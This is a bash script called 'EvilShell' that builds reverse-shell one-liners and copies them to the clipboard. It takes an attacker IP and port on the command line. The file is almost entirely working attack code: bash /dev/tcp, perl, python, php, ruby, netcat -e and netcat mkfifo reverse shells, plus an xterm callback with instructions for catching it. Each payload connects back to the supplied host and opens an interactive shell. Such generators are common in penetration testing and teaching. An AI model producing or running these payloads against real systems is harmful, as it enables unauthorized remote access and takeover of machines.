#!/bin/bash

########################################################################
#  ___________       .__ .__     _________.__             .__   .__    #
#  \_   _____/___  __|__||  |   /   _____/|  |__    ____  |  |  |  |   #
#   |    __)_ \  \/ /|  ||  |   \_____  \ |  |  \ _/ __ \ |  |  |  |   #
#   |        \ \   / |  ||  |__ /        \|   Y  \\  ___/ |  |__|  |__ #
#  /_______  /  \_/  |__||____//_______  /|___|  / \___  >|____/|____/ #
#          \/                          \/      \/      \/              #
########################################################################
###	                     @whitexnd                               ###
###	    	https://github.com/whitexnd?tab=repositories         ###
########################################################################


green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function banner(){
		echo "
___________       .__ .__     _________.__             .__   .__   
\_   _____/___  __|__||  |   /   _____/|  |__    ____  |  |  |  |  
 |    __)_ \  \/ /|  ||  |   \_____  \ |  |  \ _/ __ \ |  |  |  |  
 |        \ \   / |  ||  |__ /        \|   Y  \\\  ___/ |  |__|  |__	Made by WhiteXnd
/_______  /  \_/  |__||____//_______  /|___|  / \___  >|____/|____/
        \/                          \/      \/      \/
" | lolcat -S '80'
}

function tools(){
	tools=(xclip lolcat)
	for tool in ${tools[@]}; do
		instalada=$(which $tool > /dev/null; echo $?)
		if [ $instalada == 0 ]; then
			continue
	        elif [ $instalada == 1 ]; then
			echo -e "$yellow[!]$end Missing tool: $tool"
                        sudo apt install $tool -y > /dev/null 2>&1
                        sleep 0.2
		fi

		instalada=$(which $tool > /dev/null;  echo $?)
		if [ $instalada == 0 ]; then
			echo -e "$purple[*]$end Tool: $tool installed successfully"; sleep 2.3
		else
			echo -e "$yellow[!]$end Instalation for $tool failed, try to install it manually using: "
			echo -e "\tsudo apt install $red$tool$end"
			exit 1
		fi
	done
}

function copy(){
	echo $1 | xclip -sel clip && echo -e "\t\n$yellow[!]$end Shell copied on clipboard:"
	echo -e "$purple$1$end\n"
	if [ $# -eq 2 ]; then
		echo -e "$turquoise$2$end"
	fi
}

function bash(){
	description="[?] Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10)"
	copy "bash -i >& /dev/tcp/$ip/$port 0>&1" "$description"
}

function perl(){
	description="[?] Here’s a shorter, feature-free version of the perl-reverse-shell"
	copy "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" "$description"
}

function python(){
	description="[?] This was tested under Linux / Python 2.7"
	copy "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" "$description"
}

function php(){
	description="[?] This code assumes that the TCP connection uses file descriptor 3. If it doesn’t work, try 4, 5, 6…"
	copy "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" "$description"
}

function ruby(){
	copy "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
}

function nc(){
	description="[?] Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option"
	copy "nc -e /bin/sh $ip $port" "$description"
}

function nc2(){
	description="[?] If you have the wrong version of netcat installed, you might still be able to get your reverse shell back like this"
	copy "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f" "$description"
}

function xterm(){
	description="[?] One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you ($ip) on TCP port 6001."
	copy "xterm -display $ip:1"
	echo -e "$blue[*]$end To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):"
	echo -e "\n\t Xnest :1"
	echo -e "\n$blue[*]$end You’ll need to authorise the target to connect to you (command also run on your host):"
	echo -e "\n\t xhost $red<targetip>$end"
}

function help(){
	banner; sleep 0.4
	echo -e "\n$blue[*]$end Usage: $red$0 -i <ip_addres> -p <port>$end"
	echo -e "\n$yellow[!]$end You can specify the shell that you want whit: $red-s <shell>$end"
	echo -e "\n\t$purple[+]$end Example: $purple$0 -i 127.0.0.1 -p 443 -s bash$end"
	exit 0
}

function choose(){
        case $x in
                [0]* | [Bb]ash) bash;exit;;
                [1]* | [Pp]erl) perl;exit;;
                [2]* | [Pp]ython) python;exit;;
                [3]* | [Pp]hp) php;exit;;
		[4]* | [Rr]uby) ruby;exit;;
		[5]* | [Nn]c | [Nn]etcat) nc;exit;;
		[6]* | [Nn]c2 | [Nn]etcat2) nc2;exit;;
		[7]* | [Xx]term) xterm;exit;;
                [\!]* ) echo -e "$yellow[!]$end Exiting ...";exit;;
        esac
}

function selection(){
	shells=(bash perl python php ruby nc 'Wrong Nc (Netcat2)' xterm)
        echo -e "$blue[*]$end Select your Shell:\n"
        for i in  ${!shells[@]};do
                echo -e "\t$i -> $purple${shells[i]}$end"
        done
        echo -e "\t$yellow!) Exit$end\n"
	echo -en "$purple[+]$end Input: "
	read x
}


####### MAIN EXECUTION ######

while getopts i:p:s:h opt; do
        case $opt in
                i) ip=$OPTARG ;;
                p) port=$OPTARG ;;
		s) x=$OPTARG ;;
		h) help ;;
        esac
done




if [ -z "$ip" ] || [ -z "$port" ];then
	help
fi

tools
banner; sleep 0.4

if [ -z "$x" ]; then
	selection
fi

choose

